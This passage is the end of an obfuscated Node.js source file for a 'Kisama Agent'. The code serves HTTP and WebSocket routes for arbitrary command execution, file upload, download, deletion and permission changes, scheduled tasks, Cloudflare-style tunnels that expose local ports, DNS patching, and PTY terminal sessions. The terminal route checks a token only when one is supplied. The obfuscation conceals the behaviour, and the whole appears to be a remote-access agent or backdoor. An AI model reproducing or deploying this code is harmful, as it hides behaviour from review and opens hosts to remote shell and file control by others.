            'AsoGu': 'port\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'rpjgX': function (c, d) {
                return c === d;
            },
            'yZnxZ': function (c, d) {
                return c === d;
            },
            'KuejQ': function (c, d) {
                return c ?? d;
            },
            'xulpd': kT(0xeb),
            'DsTfT': kT(0x694),
            'fvksz': kT(0x5ad),
            'MYNMg': function (c, d) {
                return c === d;
            },
            'ioQLe': 'Server\x20listening\x20successfully',
            'wqFJN': function (c, d) {
                return c === d;
            },
            'VfWup': function (c, d) {
                return c === d;
            },
            'vqDUe': function (c, d) {
                return c === d;
            },
            'GaWtQ': kT(0xbc1),
            'HaxqQ': function (c, d) {
                return c === d;
            },
            'rGKTW': 'undefined',
            'ldOgN': kT(0xad2),
            'SFRLJ': function (c) {
                return c();
            },
            'govWr': kT(0x18a),
            'aGmAh': kT(0x918),
            'VzxZQ': kT(0x665),
            'GCoYw': 'Initializing\x20CryptoManager...',
            'EAdSZ': kT(0xc61),
            'scEzT': kT(0x81a),
            'JmaNI': kT(0x4b1),
            'yHsfi': kT(0xc29),
            'shIRY': kT(0x9a3),
            'sduYq': function (c) {
                return c();
            },
            'ZIdRo': function (c, d) {
                return c(d);
            },
            'HEOMt': 'Express\x20app\x20created\x20and\x20expressWs\x20applied',
            'sclJA': kT(0x76c),
            'nDnAL': kT(0xa1e),
            'TBAzB': kT(0xcd1),
            'RiSHJ': kT(0x737),
            'XFpwA': '/api/do',
            'zzRaf': kT(0x1ed),
            'YHpTh': kT(0x110),
            'NCKfH': kT(0xd2e),
            'UvkGv': kT(0x8a6),
            'wAPLZ': kT(0x6f6),
            'kaXFz': '/api/file/download',
            'CzbUh': kT(0xac8),
            'mHUkx': kT(0x916),
            'PTInD': kT(0x70c),
            'SEFJE': kT(0x5be),
            'GGFDN': kT(0x14e),
            'GKnMO': kT(0x523),
            'DHWpe': '/api/task/log/cron',
            'SQTzn': '/api/task/onetime/execute',
            'YumtW': kT(0x38f),
            'eezBX': kT(0x878),
            'hssqT': kT(0x934),
            'bRXFZ': 'WebSocket\x20route\x20configured',
            'OrDJo': kT(0xc04),
            'wHQqZ': 'SIGINT\x20handler\x20registered'
        };
    try {
        await b['SFRLJ'](a0cc), a0P[kT(0x4f6)](b[kT(0x480)]), a0a1[kT(0x769)](a), a0P[kT(0x4f6)](b[kT(0xc31)]), a0a1['validate'](), a0P[kT(0x4f6)](b[kT(0x22c)]), a0P[kT(0x4f6)](b[kT(0x4db)]);
        const c = new a0a9(a0a1[kT(0x90c)], a0a1[kT(0xa3f)]);
        a0P[kT(0x4f6)](b[kT(0xa35)]);
        !a0a1['DEBUG'] && !c[kT(0x88d)] && (a0P[kT(0xb4f)](kT(0x871)), a0P[kT(0xb4f)](b[kT(0xcbb)]), process[kT(0xadd)](0x1));
        a0P['debug'](kT(0x558));
        const d = new a0a8();
        d[kT(0xbfa)] = () => a0a1[kT(0xcb4)](), a0P['debug'](b['JmaNI']), a0P['debug']('Initializing\x20SystemInfoCollector...');
        const f = new a0ac();
        a0P['debug'](b[kT(0x1a9)]), a0P[kT(0x4f6)](b[kT(0x249)]);
        const g = b[kT(0xb28)](a0f);
        b['ZIdRo'](a0x, g), a0P[kT(0x4f6)](b[kT(0xc0f)]), g[kT(0x5db)]((l, m, n) => {
            const kU = kT, o = b[kU(0x30b)]['split']('|');
            let p = 0x0;
            while (!![]) {
                switch (o[p++]) {
                case '0':
                    m[kU(0x159)](b[kU(0x440)], b[kU(0x195)]);
                    continue;
                case '1':
                    if (l['method'] === b[kU(0x928)])
                        return a0a1[kU(0x1ec)] && m[kU(0xb80)](b[kU(0x356)], b[kU(0x74e)]), m['status'](0xc8)[kU(0xa40)]();
                    continue;
                case '2':
                    b[kU(0x93d)](n);
                    continue;
                case '3':
                    m[kU(0x159)](kU(0xb3c), '*');
                    continue;
                case '4':
                    m[kU(0x159)](b[kU(0x60c)], b[kU(0x7c9)]);
                    continue;
                case '5':
                    m[kU(0x159)](b[kU(0xd57)], kU(0x866));
                    continue;
                }
                break;
            }
        }), g[kT(0x5db)](a0f['text']({
            'type': l => l['path'] !== kT(0xfe),
            'limit': b[kT(0x218)]
        })), g[kT(0x5db)](a0f[kT(0x4ab)]({ 'extended': !![] })), g[kT(0x5db)](b[kT(0x830)](a0ab, c, d)), a0P[kT(0x4f6)](b[kT(0xb6e)]), g[kT(0x850)](b[kT(0xaf2)], async (l, m) => {
            const kV = kT;
            try {
                const n = await a0a1['getBaseInfoP'](), o = await a0a1[kV(0x86f)](n[kV(0x349)] || ''), p = await a0a1[kV(0x2a5)](), q = a0ac[kV(0x66b)](n, o, p);
                b[kV(0xa96)](l[kV(0x6b4)], !![]) ? (q['session_key'] = a0a1[kV(0x556)], q[kV(0x124)] = a0a1['NOISE_KEY']) : (q['session_key'] = null, q[kV(0x124)] = null), m[kV(0xb24)](q), b['jKHsE'](a0a1['KMODE'], '1') && a0c5['onBaseinfoSuccess']();
            } catch (r) {
                m[kV(0x4dc)](0x1f4)[kV(0xb24)]({
                    'status': kV(0xb4f),
                    'message': r[kV(0x8f9)]
                });
            }
        }), g[kT(0x850)](kT(0xd58), (l, m) => {
            const kW = kT;
            let n = a0a1[kW(0xa5d)];
            if (b[kW(0xd05)](l[kW(0x5a7)][kW(0x656)], undefined)) {
                const s = parseInt(l['query']['ttl'], 0xa);
                if (Number['isNaN'](s) || b[kW(0x97c)](s, 0x1) || s > a0a1[kW(0xa87)])
                    return m['status'](0x1a6)[kW(0xb24)]({ 'error': 'ttl\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x20' + a0a1[kW(0xa87)] });
                n = s;
            }
            const o = typeof l[kW(0x5a7)]['format'] === b['rnChr'] ? l[kW(0x5a7)][kW(0x6ff)][kW(0x40e)]()['toLowerCase']() : '';
            let p;
            if (b['FBngV'](o, '') || o === b['QetCw'])
                p = b[kW(0x40b)];
            else {
                if (b[kW(0x36c)](o, 'short'))
                    p = b['AUCvt'];
                else
                    return m[kW(0x4dc)](0x1a6)[kW(0xb24)]({ 'error': b['BrLba'] });
            }
            const q = d[kW(0x202)](n), r = u => new Date(u * 0x3e8)[kW(0x774)]()[kW(0xa6e)]('.000Z', 'Z');
            m['json']({
                'status': 'ok',
                'key_id': q[kW(0xf2)],
                'ttl_seconds': q[kW(0x9a6)],
                'created_at': b[kW(0x1d7)](r, q['created_at']),
                'expires_at': r(q[kW(0x42a)]),
                'ecdsa': p === b['AUCvt'] ? {
                    'private_key': q['ecdsa_private_hex'],
                    'public_key': q[kW(0x8e0)]
                } : {
                    'private_key': q[kW(0x883)]['trim'](),
                    'public_key': q[kW(0x7a3)][kW(0x40e)]()
                },
                'ecies': p === b[kW(0x50f)] ? {
                    'private_key': q[kW(0xb29)],
                    'public_key': q[kW(0x40d)]
                } : {
                    'private_key': q[kW(0xb29)],
                    'public_key': q[kW(0x3cf)]
                }
            });
        }), g[kT(0x850)](kT(0x837), async (l, m) => {
            const kX = kT;
            try {
                const n = Math['floor'](b['KezXM'](Date[kX(0x156)](), 0x3e8));
                !a0a1['_status_cache'] || b[kX(0x466)](n - a0a1[kX(0x2b0)], a0a1['STATUS_CACHE_TTL']) ? (!a0a1['_status_fetch_promise'] && (a0a1[kX(0x932)] = f[kX(0x6c6)]()['then'](p => {
                    const kY = kX, q = '0|1|3|4|2'['split']('|');
                    let r = 0x0;
                    while (!![]) {
                        switch (q[r++]) {
                        case '0':
                            a0a1['_status_cache'] = p;
                            continue;
                        case '1':
                            a0a1[kY(0x2b0)] = Math[kY(0x579)](b[kY(0x3c0)](Date[kY(0x156)](), 0x3e8));
                            continue;
                        case '2':
                            return p;
                        case '3':
                            a0a1[kY(0x932)] = null;
                            continue;
                        case '4':
                            a0P[kY(0x4f6)](b[kY(0x835)]);
                            continue;
                        }
                        break;
                    }
                })[kX(0x818)](p => {
                    a0a1['_status_fetch_promise'] = null;
                    throw p;
                })), await a0a1['_status_fetch_promise']) : a0P[kX(0x4f6)](b[kX(0x84c)]);
                const o = { ...a0a1[kX(0x521)] };
                m[kX(0xb24)](o);
            } catch (p) {
                m['status'](0x1f4)[kX(0xb24)]({
                    'status': b[kX(0x6f8)],
                    'message': p[kX(0x8f9)]
                });
            }
        });
        const h = async (l, m) => {
            const kZ = kT;
            try {
                let n = null;
                if (typeof l[kZ(0xae4)] === kZ(0x9be))
                    n = l['body']['trim']();
                else
                    l[kZ(0xae4)] && b[kZ(0xa96)](typeof l[kZ(0xae4)], kZ(0x4c7)) && (n = l[kZ(0xae4)][kZ(0x36d)] || '');
                if (!n)
                    return m['status'](0x190)[kZ(0xb24)]({
                        'status': b[kZ(0x6f8)],
                        'message': kZ(0x941)
                    });
                const o = await a0ad[kZ(0xa64)](n, {
                    'cwd': l[kZ(0xae4)][kZ(0x72b)],
                    'env': l[kZ(0xae4)][kZ(0xc1a)],
                    'timeout': a0a1['Rtimeout']
                });
                m[kZ(0xb24)](o);
            } catch (p) {
                m[kZ(0x4dc)](0x1f4)[kZ(0xb24)]({
                    'status': b[kZ(0x6f8)],
                    'message': p[kZ(0x8f9)]
                });
            }
        };
        g['post'](b['RiSHJ'], h);
        for (const l of [
                b[kT(0xaeb)],
                b['zzRaf'],
                b['YHpTh']
            ]) {
            g['post'](l, h);
        }
        g[kT(0xcdc)](kT(0x51c), async (m, n) => {
            const l0 = kT;
            try {
                const o = await a0ag[l0(0x322)](m[l0(0xae4)][l0(0x4ac)], m['body']['recursive']);
                n['json']({
                    'status': 'ok',
                    'count': o['length'],
                    'files': o
                });
            } catch (p) {
                n['status'](0x1f4)['json']({
                    'status': b['iIgkk'],
                    'message': p[l0(0x8f9)]
                });
            }
        }), g[kT(0xcdc)](b[kT(0x6d9)], async (m, n) => {
            const l1 = kT;
            try {
                const o = await a0ag[l1(0xb8e)](m[l1(0xae4)][l1(0x5b4)] || []);
                n[l1(0xb24)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[l1(0x4dc)](0x1f4)['json']({
                    'status': b[l1(0x6f8)],
                    'message': p[l1(0x8f9)]
                });
            }
        }), g[kT(0xb5d)](b[kT(0x6d9)], async (m, n) => {
            const l2 = kT;
            try {
                const o = m[l2(0xae4)][l2(0x2cf)] || {}, p = b[l2(0x13a)](m[l2(0xae4)][l2(0xd4b)], !![]), q = await a0ag['setFilePermissions'](o, p);
                n[l2(0xb24)](q);
            } catch (r) {
                n[l2(0x4dc)](0x1f4)['json']({
                    'status': b['iIgkk'],
                    'message': r[l2(0x8f9)]
                });
            }
        }), g[kT(0xcdc)](b[kT(0x605)], async (m, n) => {
            const l3 = kT;
            try {
                const o = await a0ag[l3(0x714)](m['body'][l3(0x4ac)]);
                n[l3(0xb24)](o);
            } catch (p) {
                n[l3(0x4dc)](0x1f4)[l3(0xb24)]({
                    'status': b[l3(0x6f8)],
                    'message': p['message']
                });
            }
        }), g['post'](b[kT(0x122)], async (m, n) => {
            const l4 = kT;
            try {
                const o = await a0ag[l4(0x761)](m[l4(0xae4)][l4(0x4ac)], m[l4(0xae4)]['filename'], m[l4(0xae4)]['content'], m[l4(0xae4)]['chunk_id'], m[l4(0xae4)][l4(0xc1b)]);
                n['json'](o);
            } catch (p) {
                n[l4(0x4dc)](0x1f4)[l4(0xb24)]({
                    'status': b[l4(0x6f8)],
                    'message': p[l4(0x8f9)]
                });
            }
        }), g['post'](kT(0xfe), a0f[kT(0x424)]({
            'type': b['TtCLX'],
            'limit': b[kT(0x218)]
        }), async (m, n) => {
            const l5 = kT;
            try {
                const o = b['ThPiM'](decodeURIComponent, m[l5(0x363)][b['QFvqd']] || ''), p = decodeURIComponent(m[l5(0x363)][b[l5(0x196)]] || ''), q = m[l5(0x363)][b[l5(0x64c)]], r = m['headers'][l5(0x559)];
                if (!o || !p)
                    return n['status'](0x190)[l5(0xb24)]({
                        'status': b['iIgkk'],
                        'completed': ![],
                        'message': l5(0x385)
                    });
                const s = q !== undefined ? b[l5(0x9b1)](parseInt, b['rqLWB'](String, q), 0xa) : null, t = b[l5(0x868)](r, undefined) ? b['XHnep'](parseInt, b[l5(0x9ab)](String, r), 0xa) : null, u = m[l5(0xae4)];
                if (!Buffer['isBuffer'](u))
                    return n[l5(0x4dc)](0x190)[l5(0xb24)]({
                        'status': b[l5(0x6f8)],
                        'completed': ![],
                        'message': b[l5(0x2da)]
                    });
                const v = await a0ag[l5(0x663)](o, p, u, s, t);
                n[l5(0xb24)](v);
            } catch (w) {
                n[l5(0x4dc)](0x1f4)[l5(0xb24)]({
                    'status': l5(0xb4f),
                    'completed': ![],
                    'message': w[l5(0x8f9)]
                });
            }
        }), g[kT(0xcdc)](b[kT(0xbea)], async (m, n) => {
            const l6 = kT;
            try {
                const o = await a0ag[l6(0xccc)](m[l6(0xae4)][l6(0x4ac)]);
                n['set'](l6(0x311), o[l6(0x677)][l6(0x1d9)]()), n[l6(0xb80)](l6(0x860), o[l6(0x4ac)]), n[l6(0xb80)]('content-type', b[l6(0x6f5)]);
                if (!a0a1[l6(0x1ec)] && m[l6(0x159)](b['uWgMR']) === '1' && b[l6(0x91f)](a0a1['DOWNLOAD_ENCRYPT_MAX'], 0x0) && b['XyLhU'](o[l6(0x677)], a0a1['DOWNLOAD_ENCRYPT_MAX']))
                    try {
                        const p = c[l6(0x5a3)](o[l6(0x910)], Buffer[l6(0x8c2)](a0a1[l6(0x556)], b[l6(0xa69)]));
                        return n[l6(0xb80)](b[l6(0x356)], b[l6(0x9a8)]), n[l6(0x6da)](p);
                    } catch (q) {
                        return n['status'](0x1f4)[l6(0xb24)]({
                            'status': b[l6(0x6f8)],
                            'message': b[l6(0x2c8)]
                        });
                    }
                return n[l6(0x6da)](o[l6(0x910)]);
            } catch (r) {
                n[l6(0x4dc)](0x1f4)[l6(0xb24)]({
                    'status': b[l6(0x6f8)],
                    'message': r['message']
                });
            }
        }), g[kT(0xaa3)](b[kT(0x122)], async (m, n) => {
            const l7 = kT;
            try {
                let o = m['body'][l7(0x5b4)];
                if (!o || !Array[l7(0x595)](o)) {
                    o = [];
                    if (m[l7(0xae4)]['path'])
                        o[l7(0x77f)](m[l7(0xae4)][l7(0x4ac)]);
                    if (m[l7(0xae4)]['path2'])
                        o[l7(0x77f)](m[l7(0xae4)][l7(0x48f)]);
                }
                const p = await a0ag[l7(0xb09)](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n[l7(0x4dc)](0x1f4)['json']({
                    'status': b[l7(0x6f8)],
                    'message': q['message']
                });
            }
        }), g[kT(0xb5d)](b['wAPLZ'], async (m, n) => {
            const l8 = kT;
            try {
                const o = await a0ag['moveFiles'](m[l8(0xae4)]['move_map'] || m[l8(0xae4)]);
                n[l8(0xb24)]({
                    'status': 'ok',
                    'total': o[l8(0xed)],
                    'success': o[l8(0x29a)](p => p[l8(0x4dc)] === 'ok')['length'],
                    'results': o
                });
            } catch (p) {
                n[l8(0x4dc)](0x1f4)[l8(0xb24)]({
                    'status': b[l8(0x6f8)],
                    'message': p['message']
                });
            }
        }), g[kT(0xcdc)](kT(0x718), async (m, n) => {
            const l9 = kT;
            try {
                const o = await a0ag['copyFiles'](m['body']);
                n[l9(0xb24)]({
                    'status': 'ok',
                    'total': o[l9(0xed)],
                    'success': o[l9(0x29a)](p => p[l9(0x4dc)] === 'ok')[l9(0xed)],
                    'results': o
                });
            } catch (p) {
                n[l9(0x4dc)](0x1f4)[l9(0xb24)]({
                    'status': l9(0xb4f),
                    'message': p[l9(0x8f9)]
                });
            }
        }), g[kT(0xcdc)](kT(0xbc0), async (m, n) => {
            const la = kT;
            try {
                const o = await a0ag['createDirectory'](m['body']['path']);
                n['json'](o);
            } catch (p) {
                n[la(0x4dc)](0x1f4)[la(0xb24)]({
                    'status': b['iIgkk'],
                    'message': p[la(0x8f9)]
                });
            }
        }), g[kT(0xcdc)](b[kT(0x13d)], async (m, n) => {
            const lb = kT;
            try {
                const o = m[lb(0xae4)] || {};
                if (!o['path'])
                    return n[lb(0x4dc)](0x190)[lb(0xb24)]({ 'error': b[lb(0xbee)] });
                if (!Array[lb(0x595)](o[lb(0x52e)]) || b[lb(0x115)](o[lb(0x52e)]['length'], 0x0))
                    return n[lb(0x4dc)](0x190)['json']({ 'error': b['aveTb'] });
                const p = await a0ag['zipItems'](o['path'], o['items'], !!o[lb(0xaf0)]);
                n[lb(0xb24)](p);
            } catch (q) {
                const r = /Access denied/['test'](q['message']) ? 0x193 : 0x190;
                n['status'](r)[lb(0xb24)]({
                    'status': b['iIgkk'],
                    'message': q[lb(0x8f9)]
                });
            }
        }), g[kT(0xcdc)](b[kT(0x7e3)], async (m, n) => {
            const lc = kT;
            try {
                const o = m[lc(0xae4)] || {};
                if (!o['path'])
                    return n[lc(0x4dc)](0x190)[lc(0xb24)]({ 'error': b['zxzUA'] });
                const p = await a0ag[lc(0xba3)](o[lc(0x4ac)], o[lc(0xab2)], b['smFWl'](o[lc(0x6b9)], ![]), Array[lc(0x595)](o['entries']) ? o['entries'] : null);
                n[lc(0xb24)](p);
            } catch (q) {
                const r = /Access denied/[lc(0x8d7)](q[lc(0x8f9)]) ? 0x193 : 0x190;
                n[lc(0x4dc)](r)[lc(0xb24)]({
                    'status': lc(0xb4f),
                    'message': q['message']
                });
            }
        }), g[kT(0x850)](b[kT(0x889)], (m, n) => {
            const ld = kT;
            n[ld(0xb24)](a0ai[ld(0x9ae)]());
        }), g[kT(0xcdc)](b[kT(0x889)], async (m, n) => {
            const le = kT;
            try {
                const o = await a0ai[le(0x679)](m[le(0xae4)]);
                n['json'](o);
            } catch (p) {
                n[le(0x4dc)](0x1f4)[le(0xb24)]({
                    'status': b[le(0x6f8)],
                    'message': p[le(0x8f9)]
                });
            }
        }), g['get'](b[kT(0x3fb)], (m, n) => {
            const lf = kT;
            n[lf(0xb24)](a0ai[lf(0x16d)]());
        }), g[kT(0xcdc)](b['SEFJE'], (m, n) => {
            const lg = kT;
            try {
                const o = a0ai[lg(0x475)](m['body']);
                n['json'](o);
            } catch (p) {
                n[lg(0x4dc)](0x1f4)[lg(0xb24)]({
                    'status': lg(0xb4f),
                    'message': p['message']
                });
            }
        }), g['get'](b['GGFDN'], (m, n) => {
            const lh = kT;
            n[lh(0xb24)](a0ai[lh(0x35b)]());
        }), g['get'](b[kT(0x939)], (m, n) => {
            const li = kT;
            let o = parseInt(m['query'][li(0x3fa)], 0xa) || 0x32;
            o = Math[li(0x2dc)](Math[li(0x434)](o, 0x1), 0x64), n[li(0xb24)](a0ai['getOnetimeLogs'](o));
        }), g[kT(0x850)](b[kT(0x946)], (m, n) => {
            const lj = kT;
            let o = b[lj(0x830)](parseInt, m[lj(0x5a7)][lj(0x3fa)], 0xa) || 0x32;
            o = Math['min'](Math[lj(0x434)](o, 0x1), 0x64), n['json'](a0ai[lj(0x500)](o));
        }), g['delete'](b[kT(0x939)], (m, n) => {
            const lk = kT;
            n[lk(0xb24)](a0ai['clearOnetimeLogs']());
        }), g[kT(0xaa3)](b[kT(0x946)], (m, n) => {
            const ll = kT;
            n[ll(0xb24)](a0ai['clearCronLogs']());
        }), g[kT(0x850)]('/api/task/log/summary', (m, n) => {
            const lm = kT;
            n[lm(0xb24)](a0ai[lm(0x1de)]());
        }), g[kT(0xcdc)](b['SQTzn'], async (m, n) => {
            const ln = kT;
            try {
                const o = await a0ai[ln(0x3a0)]();
                n[ln(0xb24)](o);
            } catch (p) {
                n['status'](0x1f4)[ln(0xb24)]({
                    'status': b[ln(0x6f8)],
                    'message': p[ln(0x8f9)]
                });
            }
        });
        const i = {
                'debug': (...m) => a0P[kT(0x4f6)](m['join']('\x20')),
                'info': (...m) => a0P[kT(0x1b1)](m[kT(0xaa7)]('\x20')),
                'warning': (...m) => a0P[kT(0x4fe)](m[kT(0xaa7)]('\x20'))
            }, j = new a0c4(i);
        g[kT(0x850)](b[kT(0xa59)], (m, n) => {
            const lo = kT, o = j[lo(0xaa0)]();
            n[lo(0xb24)]({
                'status': 'ok',
                'count': o[lo(0xed)],
                'tunnels': o
            });
        }), g[kT(0xcdc)](kT(0x38f), async (m, n) => {
            const lp = kT;
            try {
                const o = a0c3(m[lp(0xae4)]);
                let p = o[lp(0xae3)];
                (b['HVfSh'](p, undefined) || b[lp(0x5f3)](p, null) || b[lp(0xba0)](p, '')) && (p = a0a1[lp(0x5f8)]);
                const q = b[lp(0xa26)](Number, p);
                if (!Number[lp(0xa7a)](q) || b['wutWt'](q, 0x1) || q > 0xffff)
                    return n[lp(0x4dc)](0x1a6)[lp(0xb24)]({
                        'status': b[lp(0x6f8)],
                        'created': ![],
                        'port': p,
                        'message': b['AsoGu']
                    });
                const r = await j[lp(0xc6c)](q, b[lp(0xbf4)](o[lp(0xcc8)], !![]), b['jKHsE'](o[lp(0x7c7)], !![]) || b[lp(0x115)](o[lp(0x7c7)], 0x1) || String(o[lp(0x7c7)])[lp(0xacd)]() === b[lp(0x9a8)]);
                n[lp(0xb24)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r['tunnelDomain'],
                    'port': r[lp(0xae3)],
                    'created_at': r[lp(0x33a)],
                    'transport': r[lp(0xbaa)]
                });
            } catch (s) {
                n[lp(0x4dc)](s['status'] || 0x1f4)[lp(0xb24)]({
                    'status': b[lp(0x6f8)],
                    'created': ![],
                    'port': s['port'] ?? null,
                    'message': s[lp(0x8f9)]
                });
            }
        }), g['delete'](b['YumtW'], async (m, n) => {
            const lq = kT;
            try {
                const o = b[lq(0x1d7)](a0c3, m[lq(0xae4)]), p = o['port'], q = Number(p);
                if (b[lq(0x798)](p, undefined) || b[lq(0x3eb)](p, null) || b['FBngV'](p, '') || !Number['isInteger'](q) || q < 0x1 || q > 0xffff)
                    return n[lq(0x4dc)](0x1a6)[lq(0xb24)]({
                        'status': b[lq(0x6f8)],
                        'deleted': 0x0,
                        'port': b[lq(0x18c)](p, null),
                        'message': b[lq(0x17f)]
                    });
                const r = await j[lq(0x522)](q, o[lq(0x9e6)]);
                if (r['status'] === 'ok')
                    return n['json']({
                        'status': 'ok',
                        'deleted': r[lq(0x750)],
                        'port': q,
                        'tunnels': r['tunnels']
                    });
                return n[lq(0x4dc)](r['status'])[lq(0xb24)]({
                    'status': b[lq(0x6f8)],
                    'deleted': 0x0,
                    'port': q,
                    'message': r['message']
                });
            } catch (s) {
                n['status'](0x1f4)['json']({
                    'status': b[lq(0x6f8)],
                    'deleted': 0x0,
                    'message': s['message']
                });
            }
        }), a0P[kT(0x4f6)](b['eezBX']), g['ws'](b[kT(0x2b1)], async (m, n) => {
            const lr = kT, o = n[lr(0xbc8)][0x0];
            a0P['debug'](lr(0xc3f) + n[lr(0x763)]), a0P[lr(0x4f6)](lr(0x820) + o);
            const p = n[lr(0x5a7)][lr(0xd1e)], q = n[lr(0x5a7)][lr(0x313)], r = n[lr(0x5a7)]['meta'] === '1', s = b[lr(0xbf4)](n[lr(0x5a7)][lr(0xb0a)], '1');
            a0P['debug'](lr(0x5fc) + p);
            if (!p) {
                a0P['debug']('Closing\x20connection\x20due\x20to\x20missing\x20request_id'), m[lr(0x4f7)](0x3f0, b[lr(0x2b5)]);
                return;
            }
            if (q) {
                const u = a0a1[lr(0xf3)](), v = Buffer[lr(0x8c2)](b[lr(0x1d7)](String, q), b[lr(0x12c)]), w = Buffer[lr(0x8c2)](u, b['fvksz']), x = b[lr(0x428)](v[lr(0xed)], w['length']) && a0k[lr(0x619)](v, w);
                if (!x) {
                    a0P[lr(0x4fe)]('[终端会话\x20' + p + lr(0x34b)), m[lr(0x4f7)](0x3f0, 'Authentication\x20failed:\x20Invalid\x20Token');
                    return;
                }
            }
            const t = new a0cb();
            await t['startSession'](m, p, q, r, s);
        }), a0P[kT(0x4f6)](b[kT(0x99b)]), a0ai[kT(0x809)](), a0P[kT(0x4f6)](b[kT(0x8c5)]);
        const k = g[kT(0xa03)](a0a1[kT(0x5f8)], a0a1['HOST'], () => {
            const ls = kT;
            a0P[ls(0x4f6)]('🚀\x20Kisama\x20Agent\x20Node.js\x20v' + a0a1['AGENT_VERSION'] + ls(0xa6c) + a0a1[ls(0xbcb)] + ':' + a0a1['PORT']), a0P[ls(0x4f6)](b[ls(0x5d5)]), (b[ls(0x5b1)](a0a1[ls(0x24b)], '1') || b[ls(0x958)](a0a1[ls(0x24b)], '2') && a0c5[ls(0xb84)]()) && a0c5['activate'](j), b[ls(0x947)](process[ls(0xa65)], b['GaWtQ']) && b['HaxqQ'](typeof Bun, b[ls(0x89f)]) && a0O()[ls(0x818)](() => {
            });
        });
        process['on'](kT(0x366), () => {
            const lt = kT;
            a0P['debug'](b[lt(0x1ce)]), k[lt(0x4f7)](), process[lt(0xadd)](0x0);
        }), a0P[kT(0x4f6)](b['wHQqZ']);
    } catch (m) {
        a0P[kT(0xb4f)](kT(0x6a7), m), process['exit'](0x1);
    }
}
(require[a0ch(0x4b7)] === module || require[a0ch(0x4b7)]?.[a0ch(0xc4c)]?.[a0ch(0x659)](a0ch(0x851))) && a0cd()['catch'](a0P[a0ch(0xb4f)]);
module[a0ch(0x242)] = {
    'main': a0cd,
    'loadCurves': a0cc,
    'Config': a0a1,
    'CryptoManager': a0a9,
    'SystemInfoCollector': a0ac,
    'CommandExecutor': a0ad,
    'FileManager': a0ag,
    'TaskManager': a0ai,
    'TaskStore': a0ah,
    'ArgoTunnelManager': a0c4,
    'KModeController': a0c5,
    'ZipArchiver': a0af,
    'TempKeyManager': a0a8,
    'SecureDns': a0a4,
    'installDnsHook': a0a7,
    'patchDnsLookup': a0a6,
    'QuicConnection': a0bR,
    'QuicSession': a0bW,
    'QuicTlsClient': a0bO,
    'QuicKeys': a0by,
    'QuicReader': a0bu,
    'quicInitialKeys': a0bA,
    'quicNextKeys': a0bz,
    'quicWriteVarint': a0br,
    'quicReadVarint': a0bs,
    'quicDecodePacketNumber': a0bH,
    'quicApplyProtection': a0bF,
    'quicRemoveProtection': a0bG,
    'quicEncodeTransportParameters': a0bL,
    'quicDecodeTransportParameters': a0bK,
    'quicEncodeAck': a0bI,
    'quicRangesFromAck': a0bJ,
    'hkdfExpandLabel': a0bx,
    'CapnpBuilder': a0aB,
    'capnpMessages': a0aE,
    'capnpWords': a0aG,
    'capnpStruct': a0aF,
    'capnpText': a0aI,
    'capnpStructList': a0aH,
    'capnpReturnResult': a0aJ,
    'capnpConnectRequest': a0aK,
    'capnpConnectResponse': a0aL,
    'connectEdgeQuic': a0bX,
    'buildQuicRequest': a0bT,
    'verifyEdgeQuicCertificate': a0bP,
    'QUIC_DATA_STREAM_PREAMBLE': a0b4,
    'QUIC_SERVER_NAME': a0bd,
    'QUIC_ALPN': a0bc,
    '__ptySelector': {
        'detectLinuxLibc': a0H,
        'ptyCandidateOrder': a0I,
        'probePtyModule': a0K,
        'ensurePty': a0O,
        'PTY_QWQO_VERSION': a0G,
        'getState': () => ({
            'ready': !!a0C,
            'reason': a0D
        })
    }
};